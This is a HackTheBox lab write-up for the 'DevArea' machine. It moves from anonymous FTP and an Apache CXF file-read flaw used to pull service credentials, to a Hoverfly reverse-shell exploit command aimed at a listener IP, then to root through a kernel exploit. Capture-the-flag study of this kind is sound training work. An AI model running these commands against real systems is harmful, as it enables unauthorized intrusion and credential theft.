# DevArea: A HackTheBox Machine

## Enumeration

- Port 21: vsftpd with anonymous login allowed
- Port 22: ssh (nothing here)
- Port 8080: Jetty 9.4.27 
- Port 8500: Golang http server
- Port 8888: Golang http Hoverfly Dashboard

### Port 21

- This allows anonymous login so we login using the username **anonymous** and password being blank.
- Log in to the ftp instance and cd into the `pub` directory.
- From there download the `employee-service.jar` file.

#### Analyzing employee-service.jar

- Open this in Jadx GUI
<!-- Had to writeup spam the vulnerability here ples forgive me :(  https://tomatobuster.github.io/WriteUps/writeups/devarea.html -->
- Here, we can see that these are using a certain service called `employeeservice`, which runs on port 8080 (Jetty). The thing is, older apachhe cxfs dont validate `xop:Include` and just process the url schema.
- This can be abused via [this CVE](https://github.com/kasem545/CVE-2022-46364-Poc) to get LFI, allowing us to read arbitrary files.

### Port 8888 and Initial Access

- This is just a **hoverfly** dashboard.
- Looking up any CVEs for hoverfly I came across [this CVE](https://github.com/davidzzo23/CVE-2025-54123/blob/main/CVE-2025-54123.py), an authenticated RCE to gain a reverse shell. But where can we read the creds?
- If I assume that both the SOAP service (apache cxf) and the hoverfly dashboard run with the same user, I can abuse the LFI to possibly read the service files of the hoverfly instance, which is what I did.

```bash
python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb
```

- This allowed me to gain the credentials of the admin user, which I then abused to gain a reverse shell like this.

```bash
python exploit.py -u admin -p <admin_password> -t http://devarea.htb:8888 -c id -r <your_listener_ip> <your_listener_port> 
```

- This gave me a shell as the user `dev_ryan`, which let me gain the user flag.


## Privilege Escalation

- I let go of this box for a while and returned to it, and ironically a kernel exploit for linux was disclosed, namely the [Copy-Fail exploit](https://github.com/theori-io/copy-fail-CVE-2026-31431/tree/main), allowing an unprivileged user to gain root.
- Using the exploit I mentioned above, I got direct root 😂💀


Happy Hacking :)
